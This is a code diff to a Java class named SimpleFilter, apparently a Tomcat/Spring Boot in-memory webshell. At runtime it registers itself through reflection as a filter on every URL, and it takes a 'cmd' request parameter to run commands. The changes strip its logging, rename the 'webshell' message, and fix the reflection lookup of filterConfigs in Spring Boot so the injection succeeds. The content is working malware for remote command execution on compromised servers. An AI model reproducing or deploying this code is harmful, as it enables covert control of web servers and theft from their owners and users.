@@ -28,7 +28,7 @@ import org.apache.tomcat.util.descriptor.web.FilterMap;
  */
 public class SimpleFilter implements Filter {
 
-  public static Logger log = Logger.getLogger(x.SimpleFilter.class.toString());
+
 
   public static final String FILTE_NAME = "SimpleFilter";
 
@@ -38,13 +38,13 @@ public class SimpleFilter implements Filter {
   @Override
   public void init(FilterConfig filterConfig) throws ServletException {
     System.out.println("SimpleFilter init");
-    log.fine("SimpleFilter init");
+
   }
 
   @Override
   public void doFilter(ServletRequest req, ServletResponse resp,
       FilterChain chain) throws IOException, ServletException {
-    System.out.println("webshell call doFilter");
+    System.out.println("cmd filter 执行了");
     String cmder = req.getParameter("cmd");
 
     if (cmder != null && cmder.length() > 0) {
@@ -67,7 +67,7 @@ public class SimpleFilter implements Filter {
         // chain.doFilter(req, resp);
       } catch (Exception e) {
         // System.out.println("error:" + e.toString());
-        log.severe("执行命令出错:" + e.toString());
+
       }
     } else {
       chain.doFilter(req, resp);
@@ -111,7 +111,7 @@ public class SimpleFilter implements Filter {
 
       for (; standardContext == null; ) {
         java.lang.reflect.Field contextField = servletContext.getClass()
-            .getDeclaredField("context");
+                .getDeclaredField("context");
         contextField.setAccessible(true);
         Object o = contextField.get(servletContext);
 
@@ -132,7 +132,10 @@ public class SimpleFilter implements Filter {
       // standardContext.getClass()获取到的class:org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext
       // field = standardContext.getClass().getDeclaredField("filterConfigs");
       System.out
-          .println("standardContext.getClass()获取到的class:" + standardContext.getClass().getName());
+              .println("standardContext.getClass()获取到的class:" + standardContext.getClass().getName());
+      // 这里需要使用StandardContext.class.getDeclaredField("filterConfigs");而不是standardContext.getClass().getDeclaredField("filterConfigs");
+      // 因为在spirng boot环境当中standardContext.getClass()获取的类是TomcatEmbeddedContext，TomcatEmbeddedContext继承了StandardContext，
+      // getDeclaredField只能获取本类的private成员，不能获取父类的，导致获取filterConfigs 失败
       field = StandardContext.class.getDeclaredField("filterConfigs");
       field.setAccessible(true);
       // 获取standardContext的filterConfigs 如下定义
@@ -157,9 +160,14 @@ public class SimpleFilter implements Filter {
 
       // 获取ApplicationFilterConfig的filterDef构造方法
       Constructor constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig")
-          .getDeclaredConstructor(Context.class, FilterDef.class);
+              .getDeclaredConstructor(Context.class, FilterDef.class);
       constructor.setAccessible(true);
-      filterConfigs.put("SimpleFilter", constructor.newInstance(standardContext, filterDef));
+      filterConfigs.put(FILTE_NAME, constructor.newInstance(standardContext, filterDef));
+      FilterMap filterMap = new FilterMap();
+      filterMap.addURLPattern("/*");
+      filterMap.setFilterName(FILTE_NAME);
+      standardContext.addFilterMapBefore(filterMap);
+      System.out.println("inject filter " + FILTE_NAME + " ok");
     } catch (NoSuchFieldException e) {
       e.printStackTrace();
     } catch (IllegalAccessException e) {
@@ -171,14 +179,11 @@ public class SimpleFilter implements Filter {
     } catch (InstantiationException e) {
       e.printStackTrace();
     } catch (InvocationTargetException e) {
+      System.out.println("添加filter出现异常:"+e.toString());
       e.printStackTrace();
     }
 
-    FilterMap filterMap = new FilterMap();
-    filterMap.addURLPattern("/*");
-    filterMap.setFilterName(FILTE_NAME);
-    standardContext.addFilterMapBefore(filterMap);
-    System.out.println("inject filter " + FILTE_NAME + " ok");
+
   }
 
 
